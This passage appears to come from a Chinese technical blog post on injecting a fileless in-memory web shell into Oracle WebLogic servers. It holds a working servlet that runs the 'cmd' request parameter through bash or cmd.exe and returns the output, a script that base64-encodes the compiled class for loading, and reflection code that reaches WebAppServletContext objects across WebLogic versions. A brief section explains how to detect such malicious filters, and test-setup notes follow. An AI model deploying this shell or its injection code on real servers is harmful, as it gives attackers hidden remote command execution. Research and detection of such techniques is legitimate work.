</span></span><span class="line"><span class="cl">    <span class="kd">protected</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">req</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">resp</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">ServletException</span><span class="o">,</span> <span class="n">IOException</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">cmd</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">&#34;cmd&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="kt">boolean</span> <span class="n">isLinux</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">osTyp</span> <span class="o">=</span> <span class="n">System</span><span class="o">.</span><span class="na">getProperty</span><span class="o">(</span><span class="s">&#34;os.name&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">osTyp</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">osTyp</span><span class="o">.</span><span class="na">toLowerCase</span><span class="o">().</span><span class="na">contains</span><span class="o">(</span><span class="s">&#34;win&#34;</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">isLinux</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span><span class="o">[]</span> <span class="n">cmds</span> <span class="o">=</span> <span class="n">isLinux</span> <span class="o">?</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;bash&#34;</span><span class="o">,</span> <span class="s">&#34;-c&#34;</span><span class="o">,</span> <span class="n">cmd</span><span class="o">}</span> <span class="o">:</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">&#34;cmd.exe&#34;</span><span class="o">,</span> <span class="s">&#34;/c&#34;</span><span class="o">,</span> <span class="n">cmd</span><span class="o">};</span>
</span></span><span class="line"><span class="cl">        <span class="n">InputStream</span> <span class="n">in</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">cmds</span><span class="o">).</span><span class="na">getInputStream</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">Scanner</span> <span class="n">s</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Scanner</span><span class="o">(</span><span class="n">in</span><span class="o">).</span><span class="na">useDelimiter</span><span class="o">(</span><span class="s">&#34;\\\\a&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">String</span> <span class="n">output</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="na">hasNext</span><span class="o">()</span> <span class="o">?</span> <span class="n">s</span><span class="o">.</span><span class="na">next</span><span class="o">()</span> <span class="o">:</span> <span class="s">&#34;&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">        <span class="n">PrintWriter</span> <span class="n">out</span> <span class="o">=</span> <span class="n">resp</span><span class="o">.</span><span class="na">getWriter</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">output</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="n">out</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>base64脚本，用于编码class文件。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">test1</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sun.misc.BASE64Encoder</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">run</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">File</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">&#34;/Users/myzxcg/xx/IdeaProjects/web/target/classes/com/example/web/httpServlet.class&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">FileInputStream</span> <span class="n">fileInputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">file</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">ByteArrayOutputStream</span> <span class="n">byteArrayOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">            <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">4096</span><span class="o">];</span>
</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">len</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">while</span> <span class="o">((</span><span class="n">len</span> <span class="o">=</span> <span class="n">fileInputStream</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">bytes</span><span class="o">))!=-</span><span class="n">1</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">                <span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">bytes</span><span class="o">,</span><span class="n">0</span><span class="o">,</span><span class="n">len</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="o">}</span>
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">encode</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BASE64Encoder</span><span class="o">().</span><span class="na">encode</span><span class="o">(</span><span class="n">byteArrayOutputStream</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">());</span>
</span></span><span class="line"><span class="cl">            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">encode</span><span class="o">.</span><span class="na">replaceAll</span><span class="o">(</span><span class="s">&#34;\\r|\\n&#34;</span><span class="o">,</span><span class="s">&#34;&#34;</span><span class="o">));</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p><img src="/images/image-20211106221216.png" alt=""></p>
<h2 id="获取webappservletcontext"><a href="#获取webappservletcontext" class="anchor-link">#</a><a href="#contents:获取webappservletcontext" class="headings">获取WebAppServletContext</a></h2>
<h3 id="获取所有-context"><a href="#获取所有-context" class="anchor-link">#</a><a href="#contents:获取所有-context" class="headings">获取所有 Context</a></h3>
<p>在weblogic 10/12下经过测试，不受协议影响
<img src="/images/image-20211106221250.png" alt=""></p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">m</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;weblogic.t3.srvr.ServerRuntime&#34;</span><span class="o">).</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;theOne&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">m</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">ServerRuntime</span> <span class="n">serverRuntime</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServerRuntime</span><span class="o">)</span> <span class="n">m</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">List</span><span class="o">&lt;</span><span class="n">WebAppServletContext</span><span class="o">&gt;</span> <span class="n">list</span> <span class="o">=</span> <span class="k">new</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">ArrayList</span><span class="o">();</span>
</span></span><span class="line"><span class="cl"><span class="n">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="o">(</span><span class="n">weblogic</span><span class="o">.</span><span class="na">management</span><span class="o">.</span><span class="na">runtime</span><span class="o">.</span><span class="na">ApplicationRuntimeMBean</span> <span class="n">applicationRuntime</span> <span class="o">:</span> <span class="n">serverRuntime</span><span class="o">.</span><span class="na">getApplicationRuntimes</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Field</span> <span class="n">childrenF</span> <span class="o">=</span> <span class="n">applicationRuntime</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getSuperclass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;children&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">childrenF</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">HashSet</span> <span class="n">set</span> <span class="o">=</span> <span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">HashSet</span><span class="o">)</span> <span class="n">childrenF</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">applicationRuntime</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Iterator</span> <span class="n">iterator</span> <span class="o">=</span> <span class="n">set</span><span class="o">.</span><span class="na">iterator</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="o">(</span><span class="n">iterator</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">Object</span> <span class="n">key</span> <span class="o">=</span> <span class="n">iterator</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">key</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getName</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;weblogic.servlet.internal.WebAppRuntimeMBeanImpl&#34;</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">Field</span> <span class="n">contextF</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">contextF</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">WebAppServletContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebAppServletContext</span><span class="o">)</span> <span class="n">contextF</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">            <span class="n">list</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">context</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><h3 id="从当前线程中获取-context"><a href="#从当前线程中获取-context" class="anchor-link">#</a><a href="#contents:从当前线程中获取-context" class="headings">从当前线程中获取 Context</a></h3>
<p>已测试weblogic1036与weblogic12.1.3 成功</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Thread</span> <span class="n">thread</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">();</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//获取WebAppServletContext
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Field</span> <span class="n">workEntry</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;weblogic.work.ExecuteThread&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;workEntry&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">workEntry</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">Object</span> <span class="n">workentry</span> <span class="o">=</span> <span class="n">workEntry</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">thread</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="n">WebAppServletContext</span> <span class="n">webAppServletContext</span><span class="o">=</span><span class="kc">null</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="o">{</span> <span class="c1">//weblogic 12.1.3
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">Field</span> <span class="n">connectionHandler</span> <span class="o">=</span> <span class="n">workentry</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;connectionHandler&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">connectionHandler</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">Object</span> <span class="n">http</span> <span class="o">=</span> <span class="n">connectionHandler</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">workentry</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">Field</span> <span class="n">request1</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;request&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">request1</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">ServletRequestImpl</span> <span class="n">servletRequest</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServletRequestImpl</span><span class="o">)</span> <span class="n">request1</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">http</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">Field</span> <span class="n">context</span> <span class="o">=</span> <span class="n">servletRequest</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">webAppServletContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebAppServletContext</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletRequest</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//weblogic 1036
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">Field</span> <span class="n">context</span> <span class="o">=</span> <span class="n">workentry</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">webAppServletContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebAppServletContext</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">workentry</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){}</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p><img src="/images/image-20211106221438.png" alt=""></p>
<h3 id="从request获取-context"><a href="#从request获取-context" class="anchor-link">#</a><a href="#contents:从request获取-context" class="headings">从Request获取 Context</a></h3>
<p>Weblogic 1036不能用</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">weblogic</span><span class="o">.</span><span class="na">servlet</span><span class="o">.</span><span class="na">internal</span><span class="o">.</span><span class="na">WebAppServletContext</span> <span class="n">servletContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebAppServletContext</span><span class="o">)</span> <span class="n">request</span><span class="o">.</span><span class="na">getServletContext</span><span class="o">();</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><h3 id="获取随机路径"><a href="#获取随机路径" class="anchor-link">#</a><a href="#contents:获取随机路径" class="headings">获取随机路径</a></h3>
<p>获取到weblogic所有的WebAppServletContext后，可以调用<code>context.getRootTempDir().getAbsolutePath()</code>方法去获取目录的位置。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">List</span><span class="o">&lt;</span><span class="n">WebAppServletContext</span><span class="o">&gt;</span> <span class="n">contexts</span> <span class="o">=</span> <span class="n">findAllContext</span><span class="o">();</span>
</span></span><span class="line"><span class="cl"><span class="n">Iterator</span><span class="o">&lt;</span><span class="n">WebAppServletContext</span><span class="o">&gt;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">contexts</span><span class="o">.</span><span class="na">iterator</span><span class="o">();</span>
</span></span><span class="line"><span class="cl"><span class="n">StringBuilder</span> <span class="n">sb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuilder</span><span class="o">();</span>
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="o">(</span><span class="n">i</span><span class="o">.</span><span class="na">hasNext</span><span class="o">())</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">WebAppServletContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">i</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
</span></span><span class="line"><span class="cl">    <span class="n">sb</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">String</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="s">&#34;name %30s\\turl %30s\\tDocroot %s\\n&#34;</span><span class="o">,</span> <span class="n">context</span><span class="o">.</span><span class="na">getAppName</span><span class="o">(),</span> <span class="n">context</span><span class="o">.</span><span class="na">getContextPath</span><span class="o">(),</span> <span class="n">context</span><span class="o">.</span><span class="na">getRootTempDir</span><span class="o">().</span><span class="na">getAbsolutePath</span><span class="o">()));</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><h2 id="内存马查杀"><a href="#内存马查杀" class="anchor-link">#</a><a href="#contents:内存马查杀" class="headings">内存马查杀</a></h2>
<p>要找到是否有filter类型的内存马，只需在getFilterChain处下手即可；只要从FileManager中的filters删掉恶意filter，filter链就不会有恶意filter了。</p>
<p>filter类型的内存马有两个很致命的特点，第一是继承Filter类，第二因为我们使用defineClass加载的类，是不会有class文件落地的，因此查看它的类加载路径会返回null。</p>
<h2 id="测试注意事项"><a href="#测试注意事项" class="anchor-link">#</a><a href="#contents:测试注意事项" class="headings">测试注意事项</a></h2>
<ol>
<li>
<p>部署war包到Weblogic 1036注意Web.xml文件格式的问题</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;web-app</span> <span class="na">version=</span><span class="s">&#34;2.5&#34;</span> <span class="na">metadata-complete=</span><span class="s">&#34;true&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;&lt;http://java.sun.com/xml/ns/javaee&gt;&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">xmlns:xsi=</span><span class="s">&#34;&lt;http://www.w3.org/2001/XMLSchema-instance&gt;&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">xsi:schemaLocation=</span><span class="s">&#34;&lt;http://java.sun.com/xml/ns/javaee&gt; &lt;http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&gt;&#34;</span><span class="nt">&gt;</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div></li>
<li>
<p>本地测试时，编写的代码使用到了Weblogic的依赖，打war包的时候需要添加在pom.xml中需要添加jar包的依赖。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>weblogic.servlet.internal<span class="nt">&lt;/groupId&gt;</span><span class="c">&lt;!--groupId和artifactId随便写--&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>weblogic-classes<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>1.0.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;scope&gt;</span>system<span class="nt">&lt;/scope&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;systemPath&gt;</span>${project.basedir}/lib/weblogic-classes.jar<span class="nt">&lt;/systemPath&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;dependency&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;groupId&gt;</span>xxx<span class="nt">&lt;/groupId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;artifactId&gt;</span>xxx<span class="nt">&lt;/artifactId&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;version&gt;</span>1.0.0<span class="nt">&lt;/version&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;scope&gt;</span>system<span class="nt">&lt;/scope&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;systemPath&gt;</span>${project.basedir}/lib/weblogic.server.merged.jar<span class="nt">&lt;/systemPath&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/dependency&gt;</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div></li>
<li>
<p>从docker中导出wlserver目录下的包后，提取出所有jar包再导入idea。（不然可能找不到weblogic-classes.jar包）
windows命令</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="k">for</span> <span class="p">/</span><span class="n">f</span> <span class="s2">&#34;delims==&#34;</span> <span class="k">%</span><span class="n">a</span> <span class="k">in</span> <span class="p">(</span><span class="s1">&#39;dir /b /s C:\\Users\\xxx\\Desktop\\WeblogicEnvironment\\middleware\\bak\\*.jar&#39;</span><span class="p">)</span><span class="k">do</span> <span class="nb">copy </span><span class="p">/</span><span class="n">y</span> <span class="s2">&#34;%a&#34;</span> <span class="n">C:</span><span class="p">\\</span><span class="n">Users</span><span class="p">\\</span><span class="n">xxx</span><span class="p">\\</span><span class="n">Desktop</span><span class="p">\\</span><span class="n">jar2</span><span class="p">\\</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>Linux命令</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#复制modules下jar后缀文件到jar目录</span>
